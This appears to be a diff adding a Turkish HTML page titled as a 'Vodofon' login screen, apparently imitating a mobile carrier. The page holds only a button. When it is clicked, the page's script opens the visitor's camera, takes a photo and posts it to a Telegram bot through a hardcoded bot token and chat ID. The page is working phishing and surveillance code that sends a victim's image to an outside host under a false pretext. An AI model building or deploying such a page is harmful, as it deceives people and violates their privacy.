@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vodofon GiriÅŸ EkranÄ±</title>
+<link rel="stylesheet" href="styles.css">
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f00; /* Arka plan rengi kÄ±rmÄ±zÄ± */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  button {
+    padding: 20px 40px; /* Butonun boyutunu bÃ¼yÃ¼tmek iÃ§in padding */
+    background-color: #ff0; /* SarÄ± renkli buton */
+    color: #000; /* Buton metni rengi */
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 18px; /* Buton metni boyutu */
+  }
+
+  button:hover {
+    background-color: #ffd700; /* SarÄ± rengin biraz daha koyusu */
+  }
+</style>
+</head>
+<body>
+<button onclick="takePhotoAndSend()">BANABASðŸ˜</button>
+
+<script>
+function takePhotoAndSend() {
+  // Kamera izni iste ve fotoÄŸrafÄ± Ã§ekip bota gÃ¶nder
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+      var video = document.createElement('video');
+      document.body.appendChild(video);
+      video.srcObject = stream;
+      video.play();
+
+      video.addEventListener('canplay', function() {
+        var canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        var context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        var imgData = canvas.toDataURL('image/jpeg');
+
+        // FotoÄŸrafÄ± binary olarak gÃ¶nder
+        var binaryData = atob(imgData.split(',')[1]);
+        var arrayBuffer = new ArrayBuffer(binaryData.length);
+        var uint8Array = new Uint8Array(arrayBuffer);
+        for (var i = 0; i < binaryData.length; i++) {
+          uint8Array[i] = binaryData.charCodeAt(i);
+        }
+
+        // FotoÄŸrafÄ± FormData nesnesiyle gÃ¶nder
+        var formData = new FormData();
+        formData.append('chat_id', '5652792428'); // Sizin chat ID'niz
+        formData.append('photo', new Blob([uint8Array], { type: 'image/jpeg' }));
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://api.telegram.org/bot6723008384:AAEabFqt36ul830uAdGVhZepfThqJUCbX8I/sendPhoto');
+        xhr.send(formData);
+
+        // Kamera akÄ±ÅŸÄ±nÄ± durdur
+        stream.getTracks().forEach(track => track.stop());
+        document.body.removeChild(video);
+      });
+    })
+    .catch(function(err) {
+      console.error('Kamera eriÅŸimi reddedildi:', err);
+    });
+}
+</script>
+</body>
+</html>
